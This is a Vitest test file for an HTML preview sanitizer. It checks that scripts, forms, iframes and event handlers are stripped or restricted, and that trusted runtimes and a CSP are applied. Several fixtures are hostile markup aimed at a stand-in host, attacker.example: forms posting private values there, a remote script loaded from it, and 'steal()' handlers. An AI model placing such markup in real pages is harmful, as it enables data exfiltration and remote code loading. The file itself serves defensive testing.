import { describe, expect, it } from "vitest"

import {
  htmlPreviewCurrentPageSelector,
  htmlPreviewReadyMessageType,
} from "@/components/media/html-preview/html-preview-fit"
import {
  htmlPreviewAnnotationModeMessageType,
  htmlPreviewSelectionMessageType,
} from "@/components/media/html-preview/html-preview-selection"
import {
  buildSafeHtmlDocument,
  buildUnrestrictedHtmlPreviewDocument,
  decodeHtmlDocument,
  htmlPreviewAnnotationDocumentAttribute,
  installHtmlPreviewStorageFallback,
} from "@/components/media/html-preview/html-preview-sanitizer"

describe("HTML preview sanitizer", () => {
  it("removes executable content while preserving visual resources for the sandboxed annotation document", () => {
    const safeDocument = buildSafeHtmlDocument(`<!doctype html>
      <html>
        <head>
          <base href="https://attacker.example/">
          <link rel="stylesheet" href="https://attacker.example/style.css">
          <style>@import "https://attacker.example/import.css"; .hero { background: url(https://attacker.example/pixel.png) }</style>
        </head>
        <body onload="steal()">
          <script>steal()</script>
          <iframe src="https://attacker.example/frame"></iframe>
          <form action="https://attacker.example/submit"><input value="private"></form>
          <a href="https://attacker.example/page" onclick="steal()">Open</a>
          <img id="external" src="https://attacker.example/image.png">
          <img id="inline" src="data:image/png;base64,AA==">
        </body>
      </html>`)
    const parsed = new DOMParser().parseFromString(safeDocument, "text/html")

    expect(parsed.querySelector("script,iframe,form,base")).toBeNull()
    expect(parsed.body.getAttribute("onload")).toBeNull()
    expect(parsed.querySelector("a")?.getAttribute("href")).toBeNull()
    expect(parsed.querySelector("a")?.getAttribute("onclick")).toBeNull()
    expect(parsed.querySelector("#external")?.getAttribute("src")).toBe(
      "https://attacker.example/image.png"
    )
    expect(parsed.querySelector("#inline")?.getAttribute("src")).toBe(
      "data:image/png;base64,AA=="
    )
    expect(
      parsed.querySelector('link[rel="stylesheet"]')?.getAttribute("href")
    ).toBe("https://attacker.example/style.css")
    const cssText = Array.from(
      parsed.querySelectorAll("style"),
      (style) => style.textContent ?? ""
    ).join("\n")
    expect(cssText).toContain("@import")
    expect(cssText).toContain("attacker.example")
    expect(
      parsed.querySelector('meta[http-equiv="Content-Security-Policy"]')
    ).toBeNull()
    expect(
      parsed.documentElement.getAttribute(
        htmlPreviewAnnotationDocumentAttribute
      )
    ).toBe("true")
    expect(safeDocument).toContain("data-linksense-preview-styles")
    expect(safeDocument).toContain("background: Canvas")
  })

  it("preserves complex presentation styles that contain inline SVG data", () => {
    const safeDocument = buildSafeHtmlDocument(
      `<!doctype html>
        <html>
          <head>
            <style>
              /* Render inside <canvas class="ascii-bg">. */
              .sys-visual circle { fill: none; stroke: white; }
              .close-icon {
                mask-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><path d='M0 0'/></svg>");
              }
            </style>
          </head>
          <body><svg class="sys-visual"><circle cx="50" cy="50" r="40" /></svg></body>
        </html>`,
      "annotation"
    )
    const parsed = new DOMParser().parseFromString(safeDocument, "text/html")
    const cssText = Array.from(
      parsed.querySelectorAll("style"),
      (style) => style.textContent ?? ""
    ).join("\n")

    expect(cssText).toContain(".sys-visual circle")
    expect(cssText).toContain("data:image/svg+xml")
    expect(parsed.querySelector(".sys-visual circle")).not.toBeNull()
  })

  it("provides isolated in-memory storage when an opaque origin rejects Storage", () => {
    const targetWindow = {} as Window
    for (const name of ["localStorage", "sessionStorage"] as const) {
      Object.defineProperty(targetWindow, name, {
        configurable: true,
        get: () => {
          throw new DOMException("Opaque origin", "SecurityError")
        },
      })
    }

    installHtmlPreviewStorageFallback(targetWindow)

    const localStorage = Reflect.get(targetWindow, "localStorage") as Storage
    const sessionStorage = Reflect.get(
      targetWindow,
      "sessionStorage"
    ) as Storage
    localStorage.setItem("mode", "static")
    sessionStorage.setItem("slide", "2")
    expect(localStorage.getItem("mode")).toBe("static")
    expect(localStorage.length).toBe(1)
    expect(localStorage.key(0)).toBe("mode")
    expect(sessionStorage.getItem("slide")).toBe("2")
    expect(sessionStorage.getItem("mode")).toBeNull()
    localStorage.clear()
    expect(localStorage.length).toBe(0)
  })

  it("decodes only valid UTF-8 documents", () => {
    expect(decodeHtmlDocument(new TextEncoder().encode("<h1>你好</h1>"))).toBe(
      "<h1>你好</h1>"
    )
    expect(() => decodeHtmlDocument(new Uint8Array([0xc3, 0x28]))).toThrow()
  })

  it("preserves local interactions only in the isolated interaction document", () => {
    const rawHtml = `<!doctype html>
      <html>
        <body>
          <form id="filters" action="https://attacker.example/search" onsubmit="applyFilters(); return false">
            <input name="query">
            <button id="next" formaction="https://attacker.example/override" onclick="nextSlide()">Next</button>
          </form>
          <a id="local" href="#slide-2">Go to slide 2</a>
          <script>function nextSlide() { location.hash = "slide-2" }</script>
          <script type="module">window.moduleLoaded = true</script>
          <script src="https://attacker.example/runtime.js"></script>
        </body>
      </html>`

    const interactive = new DOMParser().parseFromString(
      buildSafeHtmlDocument(rawHtml, "interaction"),
      "text/html"
    )
    const annotation = new DOMParser().parseFromString(
      buildSafeHtmlDocument(rawHtml, "annotation"),
      "text/html"
    )

    expect(interactive.querySelector("#next")?.getAttribute("onclick")).toBe(
      "nextSlide()"
    )
    expect(interactive.querySelector("#local")?.getAttribute("href")).toBe(
      "#slide-2"
    )
    expect(interactive.querySelector("#filters")).not.toBeNull()
    expect(
      interactive.querySelector("#filters")?.getAttribute("action")
    ).toBeNull()
    expect(
      interactive.querySelector("#filters")?.getAttribute("onsubmit")
    ).toBe("applyFilters(); return false")
    expect(
      interactive.querySelector("#next")?.getAttribute("formaction")
    ).toBeNull()
    expect(interactive.querySelectorAll("script")).toHaveLength(3)
    expect(interactive.querySelector('script[type="module"]')).not.toBeNull()
    expect(interactive.querySelector("script[src]")).toBeNull()
    expect(
      interactive
        .querySelector("script")
        ?.hasAttribute("data-linksense-preview-runtime")
    ).toBe(true)
    expect(
      interactive
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content")
    ).toContain("script-src 'unsafe-inline'")
    expect(
      interactive.querySelector("[data-linksense-preview-runtime]")
    ).not.toBeNull()
    const fitRuntimeText =
      interactive.querySelector("[data-linksense-preview-runtime]")
        ?.textContent ?? ""
    expect(fitRuntimeText).toContain("root.clientWidth || window.innerWidth")
    expect(fitRuntimeText.indexOf('root.style.zoom = "1"')).toBeLessThan(
      fitRuntimeText.indexOf("root.clientWidth || window.innerWidth")
    )
    expect(fitRuntimeText).toContain(htmlPreviewAnnotationModeMessageType)
    expect(fitRuntimeText).toContain(htmlPreviewSelectionMessageType)
    expect(fitRuntimeText).toContain(htmlPreviewReadyMessageType)
    expect(fitRuntimeText).toContain("minimumViewportWidth")
    expect(fitRuntimeText).toContain("deferredFit")
    expect(fitRuntimeText).toContain(
      JSON.stringify(htmlPreviewCurrentPageSelector)
    )
    expect(fitRuntimeText).toContain("intersectsViewport")
    expect(fitRuntimeText).toContain("closestVisibleWidth")
    expect(fitRuntimeText).toContain(
      "visibleContentWidth(\n      root,\n      viewportWidth,\n      viewportHeight"
    )
    expect(fitRuntimeText).toContain("visibleWidth ??")
    expect(fitRuntimeText).toContain("installAnnotationController(window")
    expect(fitRuntimeText).toContain("selectableTargets")
    expect(fitRuntimeText).not.toContain("documentElement.cloneNode(true)")
    expect(fitRuntimeText).not.toContain("snapshot-request")
    expect(fitRuntimeText).not.toContain("animation.pause()")
    expect(fitRuntimeText).toContain("installStorageFallback(window)")
    expect(fitRuntimeText).toContain("Reflect.defineProperty")

    expect(annotation.querySelector("script")).toBeNull()
    expect(annotation.querySelector("form")).toBeNull()
    expect(
      annotation.querySelector("#next")?.getAttribute("onclick")
    ).toBeNull()
    expect(
      annotation.querySelector('meta[http-equiv="Content-Security-Policy"]')
    ).toBeNull()
  })

  it("replaces untrusted external scripts with ordered same-origin trusted runtimes", () => {
    const safeDocument = buildSafeHtmlDocument(
      `<!doctype html>
        <html>
          <head>
            <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
          </head>
          <body>
            <button class="rounded-xl bg-blue-600" onclick="this.disabled = true">
              Continue
            </button>
            <script>window.previewReady = true</script>
          </body>
        </html>`,
      "interaction",
      {
        scriptUrls: ["/assets/selection.js", "/assets/html2canvas.js"],
        bootstrapScript: "window.linksenseBootstrap = true",
      }
    )
    const parsed = new DOMParser().parseFromString(safeDocument, "text/html")
    const externalScripts = parsed.querySelectorAll("script[src]")

    expect(externalScripts).toHaveLength(2)
    expect(externalScripts[0]?.getAttribute("src")).toBe(
      "http://localhost/assets/selection.js"
    )
    expect(
      externalScripts[0]?.getAttribute("data-linksense-trusted-preview-runtime")
    ).toBe("true")
    expect(externalScripts[1]?.getAttribute("src")).toBe(
      "http://localhost/assets/html2canvas.js"
    )
    expect(safeDocument).not.toContain("cdn.jsdelivr.net")
    expect(
      parsed.querySelector("[data-linksense-preview-bootstrap]")?.textContent
    ).toContain("window.linksenseBootstrap = true")
    expect(parsed.querySelector("button")?.getAttribute("class")).toBe(
      "rounded-xl bg-blue-600"
    )
    expect(parsed.querySelector("button")?.getAttribute("onclick")).toBe(
      "this.disabled = true"
    )
    expect(
      parsed
        .querySelector('meta[http-equiv="Content-Security-Policy"]')
        ?.getAttribute("content")
    ).toContain(
      "script-src 'unsafe-inline' http://localhost/assets/selection.js http://localhost/assets/html2canvas.js"
    )
  })

  it("preserves all generated resources without applying a preview CSP", () => {
    const safeDocument = buildUnrestrictedHtmlPreviewDocument(
      `<!doctype html>
        <html>
          <head>
            <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
            <script type="module" src="https://cdn.example/app.mjs" crossorigin="anonymous"></script>
            <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
          </head>
          <body>
            <preview-app data-theme="light"></preview-app>
            <form id="search"><input name="query"></form>
            <button onclick="window.runPreview()">Run</button>
            <script type="module">import("https://cdn.example/feature.mjs")</script>
            <script>window.runPreview = () => new Worker("worker.js")</script>
          </body>
        </html>`,
      "/assets/selecto.js"
    )
    const parsed = new DOMParser().parseFromString(safeDocument, "text/html")

    expect(parsed.querySelector("form#search")).not.toBeNull()
    expect(
      parsed.querySelector("preview-app")?.getAttribute("data-theme")
    ).toBe("light")
    expect(
      parsed.querySelector(
        'link[href="https://fonts.googleapis.com/css2?family=Inter"]'
      )
    ).not.toBeNull()
    expect(parsed.querySelector("button")?.getAttribute("onclick")).toBe(
      "window.runPreview()"
    )
    expect(
      parsed.querySelector('script[type="module"][src]')?.getAttribute("src")
    ).toBe("https://cdn.example/app.mjs")
    expect(
      parsed.querySelector('script[type="module"]:not([src])')
    ).not.toBeNull()
    expect(safeDocument).toContain(
      "https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"
    )
    expect(
      parsed.querySelector(
        'script[src="http://localhost/assets/tailwind-browser.js"]'
      )
    ).toBeNull()
    expect(
      parsed.querySelector('script[src="http://localhost/assets/selecto.js"]')
    ).not.toBeNull()
    expect(
      parsed.querySelector("[data-linksense-preview-bootstrap]")?.textContent
    ).toContain(htmlPreviewReadyMessageType)
    expect(
      parsed.querySelector('meta[http-equiv="Content-Security-Policy"]')
    ).toBeNull()
  })

  it.each([
    "https://cdn.tailwindcss.com?plugins=forms,typography",
    "https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4.3.2",
    "https://unpkg.com/@tailwindcss/browser@4/dist/index.global.js",
  ])(
    "preserves the author's Tailwind version, configuration and load attributes: %s",
    (url) => {
      const html = buildUnrestrictedHtmlPreviewDocument(
        `<html><head><script src="${url}" defer crossorigin="anonymous"></script>
      <script>tailwind.config = { theme: { extend: { colors: { brand: '#123456' } } } }</script>
      <style type="text/tailwindcss">@theme { --color-brand: #123456; }</style>
      <link rel="stylesheet" href="https://cdn.example/site.css"></head><body class="bg-brand"></body></html>`,
        "/assets/selecto.js"
      )
      const parsed = new DOMParser().parseFromString(html, "text/html")
      const external = [...parsed.querySelectorAll("script[src]")].filter(
        (script) =>
          !script.hasAttribute("data-linksense-trusted-preview-runtime")
      )
      expect(external).toHaveLength(1)
      expect(external[0]?.getAttribute("src")).toBe(url)
      expect(external[0]?.hasAttribute("defer")).toBe(true)
      expect(external[0]?.getAttribute("crossorigin")).toBe("anonymous")
      expect(html).toContain("tailwind.config =")
      expect(
        parsed.querySelector('style[type="text/tailwindcss"]')?.textContent
      ).toContain("@theme")
      expect(
        parsed.querySelector('link[rel="stylesheet"]')?.getAttribute("href")
      ).toBe("https://cdn.example/site.css")
      expect(
        parsed.querySelectorAll("[data-linksense-trusted-preview-runtime]")
      ).toHaveLength(1)
    }
  )

  it("adds no CSS framework to an HTML file that does not use one", () => {
    const html = buildUnrestrictedHtmlPreviewDocument(
      "<html><head><style>main { display: grid; }</style></head><body><main>Preview</main></body></html>",
      "/assets/selecto.js"
    )
    const parsed = new DOMParser().parseFromString(html, "text/html")
    expect(
      [...parsed.querySelectorAll("script[src]")].map((script) =>
        script.getAttribute("src")
      )
    ).toEqual(["http://localhost/assets/selecto.js"])
    expect(html).not.toMatch(/tailwind/i)
    expect(html).toContain("main { display: grid; }")
  })

  it("rejects a trusted runtime outside the LinkSense origin", () => {
    expect(() =>
      buildSafeHtmlDocument("<p>Preview</p>", "interaction", {
        scriptUrls: ["https://cdn.example/runtime.js"],
        bootstrapScript: "",
      })
    ).toThrow("HTML preview runtime must use the LinkSense origin")
  })
})
